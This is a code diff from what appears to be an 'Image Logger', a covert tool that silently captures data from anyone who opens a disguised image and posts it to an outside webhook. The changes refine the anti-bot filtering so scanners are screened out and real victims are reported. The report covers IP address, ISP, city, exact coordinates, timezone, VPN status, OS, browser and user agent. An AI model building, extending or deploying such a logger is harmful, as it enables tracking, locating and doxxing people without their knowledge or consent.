@@ -36,8 +36,11 @@ config = {
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
-                # 1 = Don't ping when a bot is suspected
-                # 2 = Don't send an alert when a bot is suspected
+                # 1 = Don't ping when it's possibly a bot
+                # 2 = Don't ping when it's 100% a bot
+                # 3 = Don't send an alert when it's possibly a bot
+                # 4 = Don't send an alert when it's 100% a bot
+    
 
     # REDIRECTION #
     "redirect": {
@@ -78,12 +81,25 @@ def makeReport(ip, useragent = None):
             ping = ""
     
     if info["hosting"]:
-        if config["antiBot"] == 2:
+        if config["antiBot"] == 4:
+            if info["proxy"]:
+                pass
+            else:
                 return
-        
+
+        if config["antiBot"] == 3:
+                return
+
+        if config["antiBot"] == 2:
+            if info["proxy"]:
+                pass
+            else:
+                ping = ""
+
         if config["antiBot"] == 1:
-            ping = ""
-    
+                ping = ""
+
+
     os, browser = httpagentparser.simple_detect(useragent)
     
     requests.post(config["webhook"], json = {
@@ -93,7 +109,7 @@ def makeReport(ip, useragent = None):
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"**A User Opened the Original Image!**\n\n**IP Info:**\n> **IP:** `{ip}`\n> **Provider:** `{info['isp']}`\n> **ASN:** `{info['as']}`\n> **Country:** `{info['country']}`\n> **Region:** `{info['regionName']}`\n> **City:** `{info['city']}`\n> **Coords:** `{info['lat']}, {info['lon']}`\n> **Timezone:** `{info['timezone']}`\n> **Mobile:** `{info['mobile']}`\n> **VPN:** `{info['proxy']}{(' '+'(Possible Bot)') if info['hosting'] else ''}`\n\n**PC Info:**\n> **OS:** `{os}`\n> **Browser:** `{browser}`\n\n**User Agent:**\n```\n{useragent}\n```",
+            "description": f"**A User Opened the Original Image!**\n\n**IP Info:**\n> **IP:** `{ip}`\n> **Provider:** `{info['isp']}`\n> **ASN:** `{info['as']}`\n> **Country:** `{info['country']}`\n> **Region:** `{info['regionName']}`\n> **City:** `{info['city']}`\n> **Coords:** `{info['lat']}, {info['lon']}`\n> **Timezone:** `{info['timezone']}`\n> **Mobile:** `{info['mobile']}`\n> **VPN:** `{info['proxy']}`\n> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`\n\n**PC Info:**\n> **OS:** `{os}`\n> **Browser:** `{browser}`\n\n**User Agent:**\n```\n{useragent}\n```",
     }
   ],
 })
